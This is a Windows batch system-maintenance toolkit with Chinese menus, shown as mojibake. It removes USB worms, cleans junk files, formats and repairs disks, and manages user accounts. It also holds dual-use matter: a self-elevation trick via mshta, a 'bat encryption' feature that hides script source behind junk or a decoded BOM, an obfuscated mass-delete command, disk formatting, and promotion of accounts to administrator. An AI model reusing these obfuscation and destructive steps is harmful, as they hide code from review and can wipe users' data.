@goto chushihua
������ʣ������͂��������鲴������ꃤ�κ��y����뼘����ӗ�
�����@�Ѫp��������ࣚ��������v�����o��η�����l��䲗�����
���񃩝U�ЗL�^������ݒ������p�H�֛Ò�ȴ�������i���Iү����
�|�랚����ү�}�x�����Y���m�@�I�ؔ�����Z���֝������I���Ԓ�
���͔���̭���ؖ�����u��鲒��ʛ���쥔��럑�眂���L���t���
�ݘ��ⴶ䓯�N��ر�Β��������Ąm�ՠ��������G������ݞ�����
�Ҟ�����ү�ߞ���ۓ������a���Ɲp���ڕt������ⵤ�_���˅X��
ࡖ��W�Y�{��ס�K���Ԡ��[���źά�ִ���n�j̡����ئ���j�}��
������ʣ������͂��������鲴������ꃤ�κ��y����뼘����ӗ�
�����@�Ѫp��������ࣚ��������v�����o��η�����l��䲗�����
���񃩝U�ЗL�^������ݒ������p�H�֛Ò�ȴ�������i���Iү����
�|�랚����ү�}�x�����Y���m�@�I�ؔ�����Z���֝������I���Ԓ�
���͔���̭���ؖ�����u��鲒��ʛ���쥔��럑�眂���L���t���
�ݘ��ⴶ䓯�N��ر�Β��������Ąm�ՠ��������G������ݞ�����
�Ҟ�����ү�ߞ���ۓ������a���Ɲp���ڕt������ⵤ�_���˅X��
ࡖ��W�Y�{��ס�K���Ԡ��[���źά�ִ���n�j̡����ئ���j�}��
:chushihua
@echo off&cls&title ��&setlocal enabledelayedexpansion
setlocal
if /i "%1" equ "-ks" (goto ks)
if /i "%1" equ "-chrome" (goto chrome)
if /i "!systemdrive!" equ "x:" (goto ks)
fltmc 1>nul 2>nul
if "!errorlevel!" equ "0" (goto ks)
for /f "delims=" %%a in ("%0") do (set "weizhi=%%~fa")
if exist "!localappdata!\Microsoft\WindowsApps\wt.exe" (call :stwt) else (call :stcmd)
rem ��Ȩ�����������Ԥ���������������ʼ���ٶ�
if not exist "!temp!\dos_pre_reading_cache_os.tmp" (
	start /b wmic os get caption /value>"!temp!\dos_pre_reading_cache_os.tmp"
	start /b wmic PATH Win32_SystemEnclosure get ChassisTypes /value>"!temp!\dos_pre_reading_cache_wmictype.tmp"
	start /b reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v desktop>"!temp!\dos_pre_reading_cache_zmlj.tmp"
) else (
	type "!temp!\dos_pre_reading_cache_os.tmp">nul
	type "!temp!\dos_pre_reading_cache_wmictype.tmp">nul
	type "!temp!\dos_pre_reading_cache_zmlj.tmp">nul
)
exit 0
:stwt
start /min !comspec! /c mshta vbscript:createobject("shell.application").shellexecute("!localappdata!\Microsoft\WindowsApps\wt.exe","!weizhi!","-ks","runas",1)(window.close)
rem start /min !comspec! /c powershell -mta -nologo -noprofile start-process -filepath "wt" -argumentlist '"%0 -ks"' -verb runas>nul 2>nul
goto :eof
:stcmd
start /min !comspec! /c mshta vbscript:createobject("shell.application").shellexecute("!weizhi!","-ks","","runas",1)(window.close)
rem start /min !comspec! /c powershell -mta -nologo -noprofile start-process -filepath "!comspec!" -argumentlist '"/c %0 -ks"' -verb runas>nul 2>nul
goto :eof
:ks
(
set "dosqssj=!time!"
color f1
chcp 936>nul
set ver=20250101
set versize=175741
set fy1=___
set xz0=0
set "doh=--doh-url https://101.101.101.101/dns-query"
for /f "delims=" %%a in ("%0") do (set "weizhi=%%~fa")
set "ua=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36"
set "nx1=[+]��һҳ"
set "nx2=[-]��һҳ"
set hx=echo;_______________________________________________________________________________
if exist "!temp!\dos_pre_reading_cache_wmictype.tmp" (
	set "wmictype='type !temp!\dos_pre_reading_cache_wmictype.tmp'"
) else (
	set "wmictype='wmic PATH Win32_SystemEnclosure get ChassisTypes /value'"
)
for /f "tokens=2 delims=={}" %%a in (!wmictype!) do (
	if "%%a" equ "8" (
		set "nx1=[S]��һҳ"
		set "nx2=[A]��һҳ"
	) else (
		if "%%a" equ "9" (
			set "nx1=[S]��һҳ"
			set "nx2=[A]��һҳ"
		) else (
			if "%%a" equ "10" (
				set "nx1=[S]��һҳ"
				set "nx2=[A]��һҳ"
			)
		)
	)
)
set wmictype=
if exist "!temp!\dos_pre_reading_cache_zmlj.tmp" (
	set "zmlj=!temp!\dos_pre_reading_cache_zmlj.tmp"
) else (
	set "zmlj='"reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v desktop"'"
)
for /f "skip=2 tokens=3 delims= " %%a in (!zmlj!) do (
	set "zmlj=%%~fa"
	if not defined zmlj (set "zmlj=X:\Users\Default\Desktop")
)
for /f "tokens=3 delims=.]" %%a in ('ver') do (
	if %%a lss 10586 (set winv=1) else (set winv=0)
)
if exist "!temp!\dos_pre_reading_cache_os.tmp" (
	set "wmicos='type !temp!\dos_pre_reading_cache_os.tmp'"
) else (
	set "wmicos='wmic os get caption /value'"
	set cm=1
)
for /f "tokens=2 delims==" %%a in (!wmicos!) do (
	set "system=%%a"
	if "!cm!" equ "1" (
		set "system=!system:~0,-1!"
		set cm=
	)
	for /f "tokens=3" %%a in ("!system!") do (
		call :pd%%a 2>nul
	)
)
set wmicos=
if "!date:~11,1!" equ "��" (
	set "xingqi=!date:~11,2! "
) else (
	set "xingqi=!date:~11,3! "
)
for /f %%a in ('"echo;prompt $E^ |cmd"') do (
	set "cswz=%%a["
	set "cswz1=%%a"
)
if exist "!systemroot!\system32\choice.exe" (
	set "sel=call :choice"
) else (
	set "sel=call :set"
)
call :list
if /i "%2" neq "" (goto %2)
rem call :sjc !dosqssj! !time! jg
)
:memuv2
title DOS������!system!
cls
set color=
set color1=f
set /a "color=!random!%%5"
if "!color!" equ "0" (
	set ysbak=40;97m
) else (
	if "!color!" equ "1" (
		set ysbak=44;97m
	) else (
		if "!color!" equ "2" (
		set color=5
		set ysbak=45;97m
		) else (
			if "!color!" equ "3" (
				set ysbak=46;97m
			) else (
				if "!color!" equ "4" (
					set color=7
					set color1=8
					set ysbak=47;90m
				)
			)
		)
	)
)
set "fy=!cswz!!ysbak:~0,3!91m_!cswz!!ysbak!!cswz!!ysbak:~0,3!92m_!cswz!!ysbak!!cswz!!ysbak:~0,3!93m_!cswz!!ysbak!"
color !color!!color1!
if !start! lss 1 (set start=1)
if not defined a!start! (
	set /a "start=maxa-maxa/9*9"
	if "!start!" equ "0" (
		set /a "start=maxa-8"
	) else (
		set /a "start=maxa/9*9+1"
	)
)
set /a "memuys=start/9+1"
set /a "end=start+8"
set /a "pd=end+1"
set /a "pd1=start-1"
rem echo;��ʼ����ʱ: !jg!
if "!winv!" equ "0" (
	echo;                                    �˵� - ��!cswz!!ysbak:~0,3!92m!memuys!!cswz!!ysbak!ҳ
) else (
	echo;�������������������������������������˵� - ��!memuys!ҳ
)
echo;������!date:~0,4!��!date:~5,2!��!date:~8,2!�� !xingqi!!time:~0,8!
call :csfgf
set xx=0
for /l %%a in (!start!,1,!end!) do (
	if defined a%%a (
		set /a "xx+=1"
		set "xz!xx!=%%a"
		echo;[!xx!]!a%%a!
	)
)
if not defined a!pd! (
    if "!winv!" equ "0" (
        echo;[0]�˳�                                             !cswz!42;97m!nx2!!cswz!!ysbak!
    ) else (
        echo;[0]�˳�                                             !nx2!
    )
) else (
    if !pd1! lss 1 (
        if "!winv!" equ "0" (
            echo;[0]�˳�                                                         !cswz!42;97m!nx1!!cswz!!ysbak!
        ) else (
            echo;[0]�˳�                                             !nx1!
        )
    ) else (
        if "!winv!" equ "0" (
            echo;[0]�˳�                                             !cswz!42;97m!nx1!   !nx2!!cswz!!ysbak!
        ) else (
            echo;[0]�˳�                                             !nx1!������!nx2!
        )
    )
)
call :csfgf
set caidan=
set /p "caidan=���������ѡ��:"
call :strlen caidan jg
if "!jg!" equ "1" (
	call :checkvar caidan num jg
	if "!jg!" equ "1" (goto !xz%caidan%!)
)
if "!caidan!" equ "-" (
	set /a "pd=start-1"
	if !pd! geq 1 (
		set /a "start-=9"
		goto memuv2
	) else (
		goto memuv2.1
	)
)
if "!caidan!" equ "+" (
	set /a "pd=end+1"
	if defined a!pd! (
		set /a "start+=9"
		goto memuv2
	) else (
		goto memuv2.1
	)
)
if /i "!caidan!" equ "a" (
	set /a "pd=start-1"
	if !pd! geq 1 (
		set /a "start-=9"
		goto memuv2
	) else (
		goto memuv2.1
	)
)
if /i "!caidan!" equ "s" (
	set /a "pd=end+1"
	if defined a!pd! (
		set /a "start+=9"
		goto memuv2
	) else (
		goto memuv2.1
	)
)
if /i "!caidan:~0,2!" equ "go" (
	set "caidan=!caidan:~2!"
	call :checkvar caidan num jg
	if "!jg!" equ "1" (
		set /a "start=caidan*9-8"
		goto memuv2
	) else (
		goto memuv2.1
	)
)
if /i "!caidan!" equ "gx" (
	set "verbak=!ver!"
	goto update
)
if /i "!caidan!" equ "qzgx" (
	set verbak=0
	goto update
)
if /i "!caidan!" equ "js" (goto 49)
if /i "!caidan!" equ "kcd" (goto kcd)
if /i "!caidan!" equ "gcd" (goto gcd)
if /i "!caidan!" equ "guanji" (goto guanji)
if /i "!caidan!" equ "guanyu" (goto guanyu)
if /i "!caidan!" equ "csh" (endlocal&goto chushihua)
:memuv2.1
set /p =��������ȷ��ѡ�<nul
call :out 2
goto memuv2
:csfgf
if "!winv!" equ "0" (
	if "!fyacs!" equ "" (
    	set fya=
    	for /l %%a in (1,1,26) do (
    	    set "fya=!fya!!fy!"
    	)
		echo;!fya!
		set /a "fyacs+=1"
	) else (
    	echo;!fya!
    	set fyacs=
	)
) else (
	!hx!
)
goto :eof
:0
exit 0
:1
setlocal
title ���U�����lpk.dll����!system!
cls
echo;���������ʼ���lpl.dll����&pause>nul
cls
echo;�����������ƶ�����...
for /f "delims=" %%a in ('fsutil fsinfo drives') do (
	set "sypf=%%a"
	set "sypf=!sypf:~5!"
)
for %%a in (!sypf!) do (
	fsutil fsinfo drivetype %%a|find /i "���ƶ�������"&&(
		for /f "delims=" %%b in ('"dir /a /s /b %%alpk.dll"') do (
			if "%%~zb" equ "44032" (
				attrib -s -h -r "%%b"
				del /f /q "%%b"
				echo;��ɾ��%%b
			)
		)
	)
)
!hx!
echo;������
set /p =����������ز˵�<nul&pause>nul
endlocal
goto memuv2
:2
setlocal
title ���U�����jwgkvsq.vmx�����������߸ò���!system!
cls
echo;���������ʼ���jwgkvsq.vmx����&pause>nul
cls
echo;�����������ƶ�����...
for /f "delims=" %%a in ('fsutil fsinfo drives') do (
	set "sypf=%%a"
	set "sypf=!sypf:~5!"
)
for %%j in (!sypf!) do (
	fsutil fsinfo drivetype %%j|find /i "���ƶ�������"&&goto 2-1
)
cls
echo;û���ҵ����ƶ�����
!hx!
set /p =����������ز˵�<nul&pause>nul
endlocal
goto memuv2
:2-1
cls
echo;�������jwgkvsq.vmx����...
for /f "delims=" %%a in ('fsutil fsinfo drives') do (
	set "sypf=%%a"
	set "sypf=!sypf:~5!"
)
for %%j in (!sypf!) do (
	fsutil fsinfo drivetype %%j|find /i "���ƶ�������"&&(
		takeown/f "%%jautorun.inf"
		echo;y|cacls "%%jautorun.inf" /t /c /p everyone:f
		takeown/f "%%jRECYLER"
		echo;y|cacls "%%jRECYCLER" /t /c /p everyone:f
		attrib -s -h -r "%%jautorun.inf"
		del /f /q "%%jautorun.inf"
		rd /s /q "%%jRECYCLER"
		del /f /q "%%jRECYCLER"
		echo;jwgkvsq.vmx���������ļ�������ɾ����>"%%jRECYCLER"
	)
)
!hx!
echo;������
set /p =����������ز˵�<nul&pause>nul
endlocal
goto memuv2
:3
setlocal
title ����ϵͳ����!system!
cls
set sc=delasd123
set scw=rdasd123
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.tm%ad%p;^
						%systemdrive%\*log.txt;^
						%systemdrive%\*.dmp;^
						%systemdrive%\*.log;^
						%systemdrive%\*.gid;^
						%systemdrive%\*.chk;^
						%systemdrive%\*.old;^
						%systemdrive%\recycled\*.*;^
						%windir%\*.bak;^
						%windir%\prefetch\*.*;^
						%userprofile%\cookies\*.*;^
						"%userprofile%\Local Settings\Temporary Internet Files\*.*";^
						"%userprofile%\Local Settings\Temp\*.*";^
						"%userprofile%\recent\*.*";^
						%systemdrive%\*._mp;^
						%systemdrive%\~*.*
%scw:~0,2%/s/q %windir%\temp
md %windir%\temp
goto 3.1
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.syd;^
						%systemdrive%\*.spc;^
						%systemdrive%\*.cdr_;^
						%systemdrive%\*.#res;^
						%systemdrive%\*.---;^
						%systemdrive%\*.$$$^
						%systemdrive%\*.@@@;^
						%systemdrive%\*.??$;^
						%systemdrive%\*.??~;^
						%systemdrive%\*.~*;^
						%systemdrive%\mscreate.dir;^
						%systemdrive%\chklist.*;^
						%systemdrive%\*.ftg;^
						%systemdrive%\*.fts;^
						%systemdrive%\*.err;^
						%systemdrive%\*.prv;^
						%systemdrive%\*.ms;^
						%systemdrive%\*.wbk;^
						%systemdrive%\*.xlk^
						%systemdrive%\*.diz
:3.1
!hx!
echo;�������
set /p =����������ز˵�<nul&pause>nul
endlocal
goto memuv2
:4
title ��ʾϵͳ��Ϣ!system!
cls
systeminfo
mode
!hx!
set /p =����������ز˵�<nul&pause>nul
goto memuv2
:5
title ������������������!system!
cls
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskmgr /t reg_dword /d 00000000 /f
!hx!
set /p =����������ز˵�<nul&pause>nul
goto memuv2
:6
title ��ʾ�������ļ�(���˸��ಡ����)!system!
cls
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL" /v CheckedValue /t reg_dword /d 00000001 /f
!hx!
set /p =����������ز˵�<nul&pause>nul
goto memuv2
:7
title ���ע�������!system!
cls
echo;[Version]>%systemdrive%\windows\temp\reg.inf
echo;Signature="$CHICAGO$">>%systemdrive%\windows\temp\reg.inf
echo;[DefaultInstall]>>%systemdrive%\windows\temp\reg.inf
echo;DelReg=del>>%systemdrive%\windows\temp\reg.inf
echo;[del]>>%systemdrive%\windows\temp\reg.inf
echo;HKCU,Software\Microsoft\Windows\CurrentVersion\Policies\System,Disableregistrytools>>%systemdrive%\windows\temp\reg.inf
rundll32 syssetup,SetupInfObjectInstallAction DefaultInstall 128 %systemdrive%\windows\temp\reg.inf
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t reg_dword /d 00000000 /f
del /f /q %systemdrive%\windows\temp\reg.inf
!hx!
set /p =����������ز˵�<nul&pause>nul
goto memuv2
:8
setlocal
title ���㿪ƽ��!system!
cls
set /p "s=�����뱻��ƽ������: "
call :checkvar s num jg
if "!jg!" equ "0" (
	echo;��Ч����
	call :out 2
	endlocal
	goto 8
)
set /p "w=��ȷ��С�����λ��: "
call :checkvar w num jg
if "!jg!" equ "0" (
	echo;��Ч����
	call :out 2
	endlocal
	goto 8
)
call :sqrt !s! !w! jg
cls
echo;!s!�Ŀ�ƽ�������(��ȷ��С�����!w!λ): !jg!
!hx!
set /p =����������ز˵�<nul&pause>nul
endlocal
goto memuv2
:9
setlocal
title ������ʾ��!system!
for /f "delims=" %%a in ('hostname') do (set "hostname=%%a")
cls
ver
if !winv! equ 0 (
	cmd /k prompt !cswz!!ysbak:~0,3!92m%username%!cswz!!ysbak!@%hostname%:$p#$s
) else (
	cmd /k prompt %username%@%hostname%:$p#$s
)
endlocal
goto memuv2
:10
setlocal
title �����̸�ʽת��ΪNTFS!system!
cls
!hx!
fsutil fsinfo drives
!hx!
echo;�����������ת������ʹ�ô��̴����޸�
set zhuanhuancipan=
set /p "zhuanhuancipan=��������Ҫת�����̷�: "
cls
convert !zhuanhuancipan!:/fs:ntfs
!hx!
set /p =����������ز˵�<nul&pause>nul
endlocal
goto memuv2
:11
setlocal
title �����޸�!system!
cls
!hx!
fsutil fsinfo drives
!hx!
set cipanxioufu=
set /p "cipanxioufu=��������Ҫ�޸����̷�: "
cls
fsutil fsinfo ntfsinfo !cipanxioufu!:>nul 2>nul
if "!errorlevel!" equ "0" (
	chkdsk /x /f /sdcleanup !cipanxioufu!:
) else (
	chkdsk /f /x !cipanxioufu!:
)
!hx!
echo;�޸����
set /p =����������ز˵�<nul&pause>nul
endlocal
goto memuv2
:12
setlocal
color cf
title ��ʽ��!system!
echo;
cls
set geshihuaxuanxiang=
set /p "geshihuaxuanxiang=��ʽ����һ����Σ���ԣ��Ƿ����(y/n): "
if /i "!geshihuaxuanxiang!" equ "y" (goto 12.1)
if /i "!geshihuaxuanxiang!" equ "n" (endlocal&goto memuv2)
echo;��������ȷ��ѡ�
call :out 2
endlocal
goto 12
:12.1
cls
!hx!
fsutil fsinfo drives
!hx!
set geshihua=
set /p "geshihua=��������Ҫ��ʽ�����̷�: "
cls
label !geshihua!: format
format !geshihua!:/x/q/v:format/y
!hx!
set /p =����������ز˵�<nul&pause>nul
endlocal
goto memuv2
:76
setlocal
color 0a
title bat����!system!
cls
echo;�˹���ֻ�������ڴ��ı��ļ�����
!hx!
echo;[1]bat�ļ�����(����1)
echo;[2]bat�ļ�����
echo;[3]bat�ļ�����(����2)(�Ƽ�ʹ��)
echo;[0]���ز˵�
!hx!
set cho=1230
set shuru=
!sel!
if "!shuru!" equ "1" (goto 76.1)
if "!shuru!" equ "2" (goto 76.2)
if "!shuru!" equ "3" (goto 76.3)
if "!shuru!" equ "4" (endlocal&goto memuv2)
if "!shuru!" equ "0" (endlocal&goto memuv2)
echo;��������ȷ��ѡ�
call :out 2
endlocal
goto 76
:76.1
title bat�ļ�����(����1)!system!
cls
set jiami=
set /p "jiami=�϶���Ҫ���ܵ��ļ����˴���(e=����): "
if /i "!jiami!" equ "e" (
	endlocal
	goto 76
)
call :ljjc jiami
if "!errorlevel!" equ "0" (
	echo;��Ч·��
	call :out 2
	goto 76.1
)
cls
for /f "delims=" %%b in ("!jiami!") do (
	set /a "batpdjg=%%~zb%%2"
	if "!batpdjg!" equ "1" (
		set "batpdjg= "
	) else (
		set "batpdjg="
	)
	(
		echo;%%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a ^
%%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a ^
%%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a ^
%%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a ^
%%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a ^
%%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a ^
%%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a ^
%%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a ^
%%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a!batpdjg!
		echo;cls
	)>"%temp%\1.tmp"
	copy /b /y "%temp%\1.tmp"+"%%b" "%%~dpb����_%%~nb%%~xb">nul
	del /f /q "%temp%\1.tmp"
)
cls
echo;�������
call :out 2
endlocal
goto 76
:76.2
title bat�ļ�����!system!
cls
set jiemi=
set /p "jiemi=�϶���Ҫ���ܵ��ļ����˴���(e=����): "
if /i "!jiemi!" equ "e" (
	endlocal
	goto 76
)
call :ljjc jiemi
if "!errorlevel!" equ "0" (
	echo;��Ч·��
	call :out 2
	goto 76.2
) 
cls
for /f "delims=" %%a in ("!jiemi!") do (
	echo;>"%temp%\1.tmp"
	copy /b /y "%temp%\1.tmp"+"%%a" "%%~dpa����_%%~na%%~xa">nul
	del /f /q "%temp%\1.tmp"
)
cls
echo;�������
call :out 2
endlocal
goto 76
:76.3
cls
title bat�ļ�����(����2)!system!
set jiami=
set /p "jiami=�϶���Ҫ���ܵ��ļ����˴���(e=����): "
if /i "!jiami!" equ "e" (
	endlocal
	goto 76
)
call :ljjc jiami
if "!errorlevel!" equ "0" (
	echo;��Ч·��
	call :out 2
	goto 76.3
)
cls
for /f "delims=" %%a in ("!jiami!") do (
	set /p =//4NCg==<nul>"%temp%\1.tmp"
	certutil -decode -f "%temp%\1.tmp" "%temp%\2.tmp">nul
	copy /b /y "%temp%\2.tmp"+"%%a" "%%~dpa����_%%~na%%~xa">nul
	del /f /q "%temp%\1.tmp";"%temp%\2.tmp"
)
cls
echo;�������
call :out 2
endlocal
goto 76
:13
setlocal
title DOS������!system!
cls
!hx!
echo;ע��:DOS����ֻ�ܽ����������㣬������ֻ�ܾ�ȷ������
echo;��Ч��ֵ��Χ(-2147483648��2147483647)(c=���� e=����)
!hx!
:13.1
set biaodashi=
set /p "biaodashi=��������ʽ: "
if /i "!biaodashi!" equ "c" (endlocal&goto 13)
if /i "!biaodashi!" equ "e" (endlocal&goto memuv2)
set /a "jieguo=!biaodashi!"
echo;������:!biaodashi!=!jieguo!
!hx!
goto 13.1
:14
title ���������ʾ��������!system!
cls
reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t reg_dword /d 00000000 /f
!hx!
set /p =����������ز˵�<nul&pause>nul
goto memuv2
:15
setlocal
title �����������!system!
set cs=0
cls
echo;˵��:ֻ�������������������Χ(0-32767)(e=���ز˵�)
!hx!
set zuidazhi=
set zuixiaozhi=
set /p "zuidazhi=����������������ֵ: "
set /p "zuixiaozhi=���������������Сֵ: "
!hx!
:15.1
set /a "cs+=1"
set /a "zdzcl=zuidazhi+1"
set /a "suijishu=!random!%%(zdzcl-zuixiaozhi)+zuixiaozhi"
echo;��!cs!�β����������: !suijishu!
set tuichusuijishu=
set /p tuichusuijishu=
if /i "!tuichusuijishu!" equ "e" (endlocal&goto memuv2)
goto 15.1
:16
setlocal
title ���KHATRA����!system!
cls
echo;���������ʼ���KHATRT����&pause>nul
cls
echo;���ڽ���KHATRA��������...
call :out 2
:16(4)
set khatra=0
:16.4.1
taskkill /f /im xplorer.exe
attrib -s -h -r "%systemdrive%\windows\xplorer.exe"
del /f /q "%systemdrive%\windows\xplorer.exe"
md "%systemdrive%\windows\xplorer.exe"
taskkill /f /im ghost.exe
attrib -s -h -r "%systemdrive%\windows\system\ghost.exe"
del /f /q "%systemdrive%\windows\system\ghost.exe"
md "%systemdrive%\windows\system\ghost.exe"
taskkill /f /im khatra.exe
attrib -s -h -r "%systemdrive%\windows\system32\khatra.exe"
del /f /q "%systemdrive%\windows\system32\khatra.exe"
md "%systemdrive%\windows\system32\khatra.exe"
attrib -s -h -r "%systemdrive%\khatra.exe"
del /f /q "%systemdrive%\khatra.exe"
md "%systemdrive%\khatra.exe"
if not "!khatra!" equ "1" (
	set /a "khatra+=1"
	goto 16.4.1
)
!hx!
echo;����ɾ��KHATRA����...
!hx!
call :out 2
rd /s /q "%systemdrive%\khatra.exe";^
		"%systemdrive%\windows\xplorer.exe";^
		"%systemdrive%\windows\system\ghost.exe";^
		"%systemdrive%\windows\system32\khatra.exe";^
		"%systemdrive%\windows\k.backup";^
		"%systemdrive%\windows\system32\ntmsdata"
del /f /q "%systemdrive%\windows\youtube.cab";^
		"%systemdrive%\windows\supermodels.cab";^
		"%systemdrive%\windows\new-screamsaver.com.cab";^
		"%systemdrive%\windows\New WinZip File.cab";^
		"%systemdrive%\windows\New WinRAR ZIP archive.cab";^
		"%systemdrive%\windows\New WinRAR archive.cab";^
		"%systemdrive%\windows\mario675.cab";^
		"%systemdrive%\windows\kavSetupEng3857.cab";^
		"%systemdrive%\windows\fh_antivirussetup6534.cab";^
		"%systemdrive%\windows\CyberWar.cab";^
		"%systemdrive%\windows\khatarnakh.exe";^
		"%systemdrive%\windows\tasks\at1.job";^
		"%systemdrive%\windows\system32\avphost.dll";^
		"%systemdrive%\windows\inf\autoplay.inf"^
!hx!
echo;����ȫ��ɨ��...
!hx!
for /f "delims=" %%a in ('fsutil fsinfo drives') do (
	set "sypf=%%a"
	set "sypf=!sypf:~5!"
)
for /f "delims=" %%a in ('"for %%b in (!sypf!) do (dir /a /s /b %%b*.exe)"') do (
	if "%%~za" equ "486912" (
		attrib -s -h -r "%%a"
		del /f /q "%%a"
		echo;��ɾ��%%a
	)
)
for /f "delims=" %%c in ('"for %%d in (!sypf!) do (dir /a /s /b %%dautorun.inf)"') do (
	if "%%~zc" equ "234" (
		attrib -s -h -r "%%c"
		del /f /q "%%c"
		echo;��ɾ��%%c
	)
)
for %%k in (!sypf!) do (del /f /s /q %%k(Empty).lnk)
echo;[Version]>%systemdrive%\windows\temp\reg.inf
echo;Signature="$CHICAGO$">>%systemdrive%\windows\temp\reg.inf
echo;[DefaultInstall]>>%systemdrive%\windows\temp\reg.inf
echo;DelReg=del>>%systemdrive%\windows\temp\reg.inf
echo;[del]>>%systemdrive%\windows\temp\reg.inf
echo;HKCU,Software\Microsoft\Windows\CurrentVersion\Policies\System,Disableregistrytools>>%systemdrive%\windows\temp\reg.inf
rundll32 syssetup,SetupInfObjectInstallAction DefaultInstall 128 %systemdrive%\windows\temp\reg.inf
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL" /v CheckedValue /t reg_dword /d 00000001 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t reg_dword /d 00000000 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\Current Version\Policies\Explorer" /v nosetfolders /t reg_dword /d 00000000 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t reg_dword /d 00000000 /f
del /f /q %systemdrive%\windows\temp\reg.inf
if /i "!sypf!" equ "c:\" (goto shoudong)
if /i "!sypf!" equ "c:\ " (goto shoudong)
call :out 2
:16(1)
!hx!
set zhucebiaoqingli=
set /p "zhucebiaoqingli=ע�����Ҫ�ֶ�����.�Ƿ��ע���(y/n):"
if /i "!zhucebiaoqingli!" equ "y" (goto 16.2)
if /i "!zhucebiaoqingli!" equ "n" (goto 16.3)
echo;��������ȷ��ѡ�
call :out 2
goto 16(1)
:16.2
cls
regedit
:16.3
cls
echo;KHATRA����������
set /p =����������ز˵�<nul&pause>nul
endlocal
goto memuv2
:shoudong
for /f "delims=" %%a in ('fsutil fsinfo drives') do (
	set "sypf=%%a"
	set "sypf=!sypf:~5!"
)
for /f "delims=" %%a in ('"for %%b in (!sypf!) do (dir /a /s /b %%b*.exe)"') do (
	if "%%~za" equ "486912" (
		attrib -s -h -r "%%a"
		del /f /q "%%a"
		echo;��ɾ��%%a
	)
)
for /f "delims=" %%c in ('"for %%d in (!sypf!) do (dir /a /s /b %%dautorun.inf)"') do (
	if "%%~zc" equ "234" (
		attrib -s -h -r "%%c"
		del /f /q "%%c"
		echo;��ɾ��%%c
	)
)
goto 16(1)
:17
cls
start regedit
goto memuv2
:18
cls
start control
goto memuv2
:19
cls
start dxdiag
goto memuv2
:20
cls
start compmgmt.msc
goto memuv2
:21
setlocal
title �û�����!system!
set "cho=123456780"
cls
!hx!
echo;[1]��ʾ���е��û�
echo;[2]�������û�
echo;[3]ɾ���û�
echo;[4]�����û�Ϊ����Ա
echo;[5]ǿ���޸��û�����
echo;[6]�鿴�û���Ϣ
echo;[7]�����˻�
echo;[8]ͣ���˻�
echo;[0]���ز˵�
!hx!
!sel!
if "!shuru!" equ "1" (goto 21.1)
if "!shuru!" equ "2" (goto 21.2)
if "!shuru!" equ "3" (goto 21.3)
if "!shuru!" equ "4" (goto 21.4)
if "!shuru!" equ "5" (goto 21.5)
if "!shuru!" equ "6" (goto 21.6)
if "!shuru!" equ "7" (goto 21.7)
if "!shuru!" equ "8" (goto 21.8)
if "!shuru!" equ "9" (endlocal&goto memuv2)
if "!shuru!" equ "0" (endlocal&goto memuv2)
set /p =��������ȷ��ѡ�<nul
call :out 2
endlocal
goto 21
:21.1
title ��ʾ���е��û�!system!
cls
!hx!
net user
!hx!
echo;��ǰ�ѵ�¼���û�:!username!
!hx!
set /p =�����������<nul&pause>nul
endlocal
goto 21
:21.2
title �������û�!system!
cls
echo;ע��:�������û�����Ϊ��ͨ�û�
!hx!
net user
!hx!
echo;��ǰ�ѵ�¼���û�:!username!
!hx!
set xinyonghuming=
set xinyonghumima=
set /p "xinyonghuming=�û���: "
set /p "xinyonghumima=����: "
!hx!
cls
net user !xinyonghuming! !xinyonghumima! /add
!hx!
set /p =�����������<nul&pause>nul
endlocal
goto 21
:21.3
title ɾ���û�!system!
cls
!hx!
net user
!hx!
echo;��ǰ�ѵ�¼���û�:!username!
!hx!
set shanchuyonghu=
set /p "shanchuyonghu=������Ҫɾ�����û�: "
cls
net user !shanchuyonghu! /del
!hx!
set /p =�����������<nul&pause>nul
endlocal
goto 21
:21.4
title �����û�Ϊ����Ա!system!
cls
!hx!
net user
!hx!
echo;��ǰ�ѵ�¼���û�:!username!
!hx!
set tishengyonghu=
set /p "tishengyonghu=������Ҫ�������û���: "
cls
net localgroup administrators !tishengyonghu! /add
!hx!
set /p =�����������<nul&pause>nul
endlocal
goto 21
:21.5
title ǿ���޸��û�����!system!
cls
!hx!
